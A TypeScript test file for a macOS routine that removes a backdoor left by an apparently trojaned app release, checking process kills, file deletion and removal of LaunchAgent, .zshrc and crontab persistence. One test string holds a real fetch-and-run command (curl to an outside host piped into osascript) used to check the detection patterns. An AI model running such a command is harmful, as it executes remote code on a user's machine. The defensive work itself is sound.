import { describe, expect, test } from "bun:test";

import {
  backdoorProcesses,
  type CleanupSystem,
  removeBackdoor,
} from "./backdoor-cleanup";

const home = "/Users/someone";

/** A Mac as far as the cleanup sees it: files, running processes, a crontab. */
function fakeMac(
  files: Record<string, string> | string[],
  options: { processes?: string[]; crontab?: string } = {},
) {
  const present = new Map<string, string>(
    Array.isArray(files)
      ? files.map((path) => [path, ""])
      : Object.entries(files),
  );
  const processes = new Set(options.processes ?? []);
  let crontab = options.crontab ?? "";
  const ran: string[][] = [];
  const system: CleanupSystem = {
    home,
    exists: async (path) => present.has(path),
    list: async (folder) =>
      [...present.keys()]
        .filter((path) => path.startsWith(`${folder}/`))
        .map((path) => path.slice(folder.length + 1)),
    read: async (path) => {
      const text = present.get(path);
      if (text === undefined) throw new Error("ENOENT");
      return text;
    },
    write: async (path, text) => {
      present.set(path, text);
    },
    remove: async (path) => {
      present.delete(path);
    },
    run: async (args, input) => {
      ran.push(args);
      const [command, flag, pattern] = args;
      if (command === "pgrep") {
        const ok = [...processes].some((line) =>
          new RegExp(pattern!).test(line),
        );
        return { ok, output: "" };
      }
      if (command === "pkill") {
        for (const line of processes)
          if (new RegExp(pattern!).test(line)) processes.delete(line);
        return { ok: true, output: "" };
      }
      if (command === "crontab" && flag === "-l")
        return { ok: crontab !== "", output: crontab };
      if (command === "crontab" && flag === "-") {
        crontab = input ?? "";
        return { ok: true, output: "" };
      }
      if (command === "id") return { ok: true, output: "501\n" };
      return { ok: true, output: "" };
    },
  };
  return { system, present, processes, ran, crontab: () => crontab };
}

describe("removeBackdoor", () => {
  test("does nothing on a Mac the trojaned 0.4.2 never ran on", async () => {
    const mac = fakeMac({
      [`${home}/.zshrc`]: "export PATH=/opt/homebrew/bin:$PATH\n",
      "/tmp/.fdaask-1.as": "",
    });
    expect(await removeBackdoor(mac.system)).toBe("absent");
    expect(mac.ran.some((args) => args[0] === "pkill")).toBe(false);
    expect(mac.present.has("/tmp/.fdaask-1.as")).toBe(true);
  });

  test("stops the backdoor and its scripts, then deletes everything it left", async () => {
    const mac = fakeMac(
      [
        `${home}/.teneo-sync-helper`,
        `${home}/.teneo-sync.json`,
        "/tmp/.httpcode",
        "/tmp/.fdaask-81452.as",
        "/tmp/unrelated.txt",
      ],
      { processes: [`${home}/.teneo-sync-helper`] },
    );
    expect(await removeBackdoor(mac.system)).toBe("removed");
    for (const pattern of backdoorProcesses)
      expect(mac.ran).toContainEqual(["pkill", "-f", pattern]);
    expect([...mac.present.keys()]).toEqual(["/tmp/unrelated.txt"]);
    expect(mac.processes.size).toBe(0);
  });

  test("still cleans up when only the marker is left", async () => {
    const mac = fakeMac([`${home}/.teneo-sync.json`]);
    expect(await removeBackdoor(mac.system)).toBe("removed");
    expect(mac.present.size).toBe(0);
  });

  test("takes out whatever would start it again, and nothing else", async () => {
    const agent = `${home}/Library/LaunchAgents/com.teneo.sync.plist`;
    const mac = fakeMac(
      {
        [agent]: `<string>${home}/.teneo-sync-helper</string>`,
        [`${home}/Library/LaunchAgents/com.other.plist`]:
          "<string>/usr/bin/true</string>",
        [`${home}/.zshrc`]: `export EDITOR=vim\n(${home}/.teneo-sync-helper &)\nalias ll='ls -l'\n`,
      },
      { crontab: `0 9 * * * backup.sh\n@reboot ${home}/.teneo-sync-helper\n` },
    );
    expect(await removeBackdoor(mac.system)).toBe("removed");
    expect(mac.ran).toContainEqual(["launchctl", "bootout", "gui/501", agent]);
    expect(mac.present.has(agent)).toBe(false);
    expect(
      mac.present.has(`${home}/Library/LaunchAgents/com.other.plist`),
    ).toBe(true);
    expect(mac.present.get(`${home}/.zshrc`)).toBe(
      "export EDITOR=vim\nalias ll='ls -l'\n",
    );
    expect(mac.crontab()).toBe("0 9 * * * backup.sh\n");
  });

  test("says so when something is still there, so the next launch tries again", async () => {
    const mac = fakeMac([
      `${home}/.teneo-sync-helper`,
      `${home}/.teneo-sync.json`,
    ]);
    const remove = mac.system.remove;
    mac.system.remove = async (path) => {
      if (path.endsWith(".teneo-sync-helper")) throw new Error("busy");
      await remove(path);
    };
    expect(await removeBackdoor(mac.system)).toBe("incomplete");
    expect([...mac.present.keys()]).toEqual([`${home}/.teneo-sync-helper`]);
  });

  test("a process that survives pkill counts as not removed", async () => {
    const mac = fakeMac([`${home}/.teneo-sync-helper`], {
      processes: [`${home}/.teneo-sync-helper`],
    });
    const run = mac.system.run;
    mac.system.run = async (args, input) =>
      args[0] === "pkill" ? { ok: false, output: "" } : run(args, input);
    expect(await removeBackdoor(mac.system)).toBe("incomplete");
  });

  test("its process patterns match the backdoor's real command lines and not Teneo's", () => {
    const matches = (line: string) =>
      backdoorProcesses.some((pattern) => new RegExp(pattern).test(line));
    expect(matches(`${home}/.teneo-sync-helper`)).toBe(true);
    expect(
      matches(
        'sh -c curl -k -s "https://modalgrid.com/dynamic?txd=ac2edb8e" | osascript',
      ),
    ).toBe(true);
    expect(
      matches("/usr/bin/osascript /tmp/.fdaask-81452.as Full Disk Access"),
    ).toBe(true);
    expect(
      matches("/Applications/Teneo.app/Contents/MacOS/tjs run entry.js"),
    ).toBe(false);
  });
});
